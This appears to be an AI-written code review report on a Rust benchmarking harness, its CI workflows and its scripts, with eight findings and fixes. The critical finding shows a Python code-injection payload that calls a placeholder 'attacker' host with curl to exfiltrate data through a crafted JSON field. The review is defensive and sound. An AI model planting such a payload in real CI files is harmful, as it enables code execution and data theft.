---
phase: 01-measurement-infrastructure-compute-baselines
reviewed: 2026-08-09T12:00:00Z
depth: standard
files_reviewed: 16
files_reviewed_list:
  - .github/workflows/bench.yml
  - .github/workflows/wasm-size.yml
  - Cargo.toml
  - benches/baseline_suite.rs
  - crates/anofox-bench-harness/Cargo.toml
  - crates/anofox-bench-harness/benches/iai_suite.rs
  - crates/anofox-bench-harness/src/baseline.rs
  - crates/anofox-bench-harness/src/fixtures.rs
  - crates/anofox-bench-harness/src/lib.rs
  - crates/anofox-bench-harness/tests/dhat_peak.rs
  - crates/anofox-forecast-js/src/forecaster.rs
  - crates/anofox-forecast-js/src/laplace_playground.rs
  - scripts/update_criterion.sh
  - scripts/update_dhat.sh
  - scripts/update_iai.sh
  - scripts/update_wasm_size.sh
findings:
  critical: 1
  warning: 4
  info: 3
  total: 8
status: issues_found
---

# Phase 01: Code Review Report

**Reviewed:** 2026-08-09T12:00:00Z
**Depth:** standard
**Files Reviewed:** 16
**Status:** issues_found

## Summary

This phase introduced a new `anofox-bench-harness` crate (iai, dhat, criterion fixtures and
schema), four maintainer capture scripts, two read-only CI workflows, and a PERF-06 dead-code
removal in the JS bindings crate. The overall architecture is sound: least-privilege CI
permissions, correct `set -euo pipefail`, proper trap-on-EXIT cleanup, and a clear schema in
`baseline.rs`. The PERF-06 removal is safe — the `JsCast` import at line 8 of `forecaster.rs`
remains in use at line 1849 (`dyn_into()` in `VARForecaster::fit_multivariate`), and no
`pub(crate) inner()` methods or unnecessary `mut` bindings are visible in the current file.

One security finding requires attention: the `wasm-size.yml` CI workflow interpolates a
repository-committed JSON value directly into a Python `exec`-equivalent string. Four warnings
cover a misleading comment in `bench.yml`, a `stat` portability gap on macOS, a fixture
seed-initialization divergence between `iai_suite.rs` and `baseline_suite.rs`, and a missing
valgrind version guard in `update_iai.sh`. Three info items note a superfluous f-string,
missing `distributional` coverage in `update_criterion.sh`, and the vacuous-first-run behaviour
of the iai soft-limit gate.

---

## Critical Issues

### CR-01: Python Code Injection via Crafted `wasm_size.json` in CI

**File:** `.github/workflows/wasm-size.yml:58-66`

**Issue:** The `Check WASM size gate` step extracts the baseline value from
`.planning/baselines/wasm_size.json` and interpolates it **unquoted** directly into a
multi-statement Python `python3 -c "..."` invocation:

```yaml
BASELINE=$(python3 -c "import json; d=json.load(open('.planning/baselines/wasm_size.json')); print(d['bytes'])")
python3 -c "
current, baseline = $CURRENT, $BASELINE
...
```

If a contributor submits a PR that modifies `wasm_size.json` to contain a crafted `"bytes"`
field — for example `"bytes": "0; import os; os.system('curl http://attacker/exfil')"` — the
outer `python3 -c` that extracts `$BASELINE` prints the string verbatim, and the second
`python3 -c` then executes `current, baseline = 12345, 0; import os; os.system(...)`. Python
semicolons are statement separators, so the injected code runs.

The workflow is triggered by `pull_request` (line 9), meaning it runs against the PR
contributor's version of the file. With `permissions: contents: read` the blast radius is
limited (no repo writes, no secret exfiltration under default GitHub fork-PR settings), but the
injection can disrupt CI, produce misleading pass/fail signals, or escalate if the repo grants
broader workflow tokens.

**Fix:** Extract the baseline byte count as a numeric integer and validate it before
interpolating, or pass it as an environment variable rather than inlining it in the Python
source. The safest approach is to do all comparison logic inside the Python that directly reads
the JSON — removing the shell interpolation entirely:

```yaml
- name: Check WASM size gate (D-11 fail if > 1% growth)
  run: |
    CURRENT=$(stat --format=%s js/anofox_forecast_js_bg.wasm)
    python3 - "$CURRENT" <<'PYEOF'
    import json, sys
    current = int(sys.argv[1])
    with open('.planning/baselines/wasm_size.json') as f:
        d = json.load(f)
    baseline = int(d['bytes'])   # int() validates it is numeric
    delta = (current - baseline) / baseline * 100
    print(f'WASM size: current={current}B  baseline={baseline}B  delta={delta:.2f}%')
    if delta > 1.0:
        raise SystemExit(f'WASM size grew {delta:.2f}% (threshold 1.0%)')
    print('PASS: WASM size within 1% of baseline')
    PYEOF
```

This moves the JSON read inside Python, avoids any shell interpolation of file-derived data into
Python source, and validates the byte count is a real integer.

---

## Warnings

### WR-01: `bench.yml` Comment Claims It Reads `iai.json` — It Does Not

**File:** `.github/workflows/bench.yml:4-5`

**Issue:** Lines 4–5 state: *"This job only reads `.planning/baselines/iai.json`"*. This is
incorrect. The workflow never reads `iai.json`. The iai-callgrind soft-limit gate works by
comparing the current callgrind output against the **previous run's callgrind output stored in
`target/`**, which is preserved across runs by `Swatinem/rust-cache@v2`. The
`.planning/baselines/iai.json` file is a human-readable reference produced by
`update_iai.sh`; it is not read by `cargo bench` or the iai runtime.

A secondary consequence: on first CI run or after a cache miss, there is no stored callgrind
output in `target/`, so the soft-limit (`EventKind::Ir, 1.0`) shows `N/A` comparisons and does
**not** fail. A regression-introducing PR could therefore pass the gate on the first post-cache-
miss run.

**Fix:** Correct the comment to accurately describe the gate mechanism. Optionally document
the cache-miss bootstrap behaviour:

```yaml
# This job compares the current callgrind instruction count against the previous run's
# stored output in target/ (preserved across runs via Swatinem/rust-cache@v2).
# .planning/baselines/iai.json is a human-readable reference only — it is NOT read here.
# NOTE: on a cache miss (first run or key rotation) no prior baseline exists; the
# soft-limit gate shows N/A and passes vacuously for that run.
```

---

### WR-02: `update_wasm_size.sh` Uses `stat --format=%s` (Linux-only)

**File:** `scripts/update_wasm_size.sh:32`

**Issue:** `stat --format=%s` is a GNU coreutils syntax. On macOS the equivalent is
`stat -f%z`. A developer running this script on macOS will get:

```
stat: illegal option -- -
usage: stat [-FlLnqrsx] [-f format] [-t timefmt] [file ...]
```

followed by an empty `BYTES` variable, causing the JSON to be written with a blank or
syntax-invalid `bytes` field.

**Fix:** Add a portability shim at the top of the measurement block:

```bash
if [[ "$(uname)" == "Darwin" ]]; then
    BYTES=$(stat -f%z js/anofox_forecast_js_bg.wasm)
else
    BYTES=$(stat --format=%s js/anofox_forecast_js_bg.wasm)
fi
```

---

### WR-03: Batch Fixture Seed Initialization Diverges Between `iai_suite.rs` and `baseline_suite.rs`

**File:** `crates/anofox-bench-harness/benches/iai_suite.rs:43` and
`benches/baseline_suite.rs:71`

**Issue:** The D-08 principle ("single source of truth for fixtures") is violated for the
batch-100 series generator. The two suites initialize the per-series LCG state differently,
producing **different synthetic input data** for the same logical benchmark:

- `iai_suite.rs` `setup_batch_100`: `rng_state = s.wrapping_add(1).wrapping_mul(6364136223846793005)`
  (multiply first, then begin the LCG loop)
- `baseline_suite.rs` `make_batch_100`: `rng_state = seed + 1` (plain add, then LCG loop)

Because the harness crate cannot import `make_seeded_series` from the root crate (circular
dependency), the batch fixture was inlined separately — but the inlining introduced an
initialization divergence. The iai and criterion batch benchmarks therefore exercise different
data distributions. If a code change shifts the median runtime for one distribution more than the
other, criterion and iai results become incomparable.

**Fix:** Update `iai_suite.rs::setup_batch_100` to use the identical initialization as
`baseline_suite.rs::make_batch_100` (i.e., `rng_state = seed + 1`), or document the intentional
difference with a note explaining why it is acceptable for instruction-count measurement.

```rust
// In iai_suite.rs setup_batch_100 — use identical init to baseline_suite make_batch_100
for s in 0..100u64 {
    let mut rng_state: u64 = s + 1;   // was: s.wrapping_add(1).wrapping_mul(...)
    // rest unchanged
```

---

### WR-04: `update_iai.sh` Checks Valgrind Presence But Not Minimum Version

**File:** `scripts/update_iai.sh:22-27`

**Issue:** The script verifies `command -v valgrind` (existence) and prints the version string
for informational purposes, but does not **validate** that the installed version is >= 3.20.0
as required. A developer with valgrind 3.18 or older would proceed to run the bench, hit an
incompatibility inside iai-callgrind, and get an opaque error rather than a clear prerequisite
failure message.

**Fix:** Parse the major.minor version and fail early:

```bash
VALGRIND_VERSION=$(valgrind --version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+' | head -1)
VALGRIND_MAJOR=${VALGRIND_VERSION%%.*}
VALGRIND_MINOR=${VALGRIND_VERSION##*.}
if [ -z "$VALGRIND_VERSION" ] || \
   [ "$VALGRIND_MAJOR" -lt 3 ] || \
   { [ "$VALGRIND_MAJOR" -eq 3 ] && [ "$VALGRIND_MINOR" -lt 20 ]; }; then
    echo "ERROR: valgrind >= 3.20.0 required, found: $VALGRIND_VERSION" >&2
    exit 1
fi
```

---

## Info

### IN-01: Superfluous `f`-String in `update_wasm_size.sh`

**File:** `scripts/update_wasm_size.sh:67`

**Issue:** The final `print` statement inside the unquoted heredoc uses an f-string prefix:

```python
print(f"Wrote .planning/baselines/wasm_size.json: ${BYTES} bytes")
```

The unquoted heredoc causes shell to expand `${BYTES}` before Python sees the string, so Python
receives a literal like `print(f"Wrote ....: 1234567 bytes")`. The `f` prefix does nothing —
there are no Python `{...}` interpolation targets in the resulting string. The print works
correctly but the `f` prefix is misleading to readers who expect it to perform Python-level
interpolation.

**Fix:** Remove the `f` prefix or, if shell expansion is intentional, add a comment:

```python
print("Wrote .planning/baselines/wasm_size.json: ${BYTES} bytes")  # ${BYTES} shell-expanded
```

---

### IN-02: `update_criterion.sh` Cannot Capture Laplace Baselines with `parallel` Enabled

**File:** `scripts/update_criterion.sh:56`

**Issue:** The script runs the criterion suite twice: once with `--features parallel` and once
with no features. Neither run includes `--features distributional`, so the
`#[cfg(feature = "distributional")]` Laplace benchmarks in `baseline_suite.rs` never execute.
The Python parser silently skips missing Laplace entries. As a result, `criterion.json` will
never include `laplace_fit_predict_n200` or `laplace_batch100_fit_predict_n200` entries under
the `parallel` profile, and the `parallel` profile Laplace baseline can never be committed even
if a maintainer wants it.

**Fix:** If Laplace baselines are in scope, add a third profile run:

```bash
echo "--- Profile 3/3: parallel+distributional ---"
cargo bench --bench baseline_suite --features "parallel,distributional" -- --save-baseline parallel_dist_run
```

and extend `PROFILES` in the Python block accordingly. If Laplace baselines are intentionally
out of scope for now, add a comment to that effect in `update_criterion.sh` near the
`BENCH_NAMES` list.

---

### IN-03: `active_features` Field Is Always Empty in `criterion.json` Provenance

**File:** `scripts/update_criterion.sh:156`

**Issue:** The top-level `provenance.active_features` field in the generated `criterion.json` is
always set to `[]`. This contradicts the D-02 schema intent ("Cargo feature flags active during
the capture run") because the criterion run is specifically a dual-profile capture with different
feature sets per profile. A reader of the JSON cannot determine which features were active for
any given profile without consulting the `profile` field on each benchmark entry.

**Fix:** Populate `active_features` per-profile at the entry level (the `CriterionEntry` struct
already has a `profile` field, which is sufficient), and clarify the provenance comment:

```python
"active_features": ["see per-entry 'profile' field: parallel=rayon, no_parallel=none"],
```

or extend `CriterionEntry` to carry a `features: Vec<String>` field that records the exact
`--features` flags used for that entry's profile run.

---

_Reviewed: 2026-08-09T12:00:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
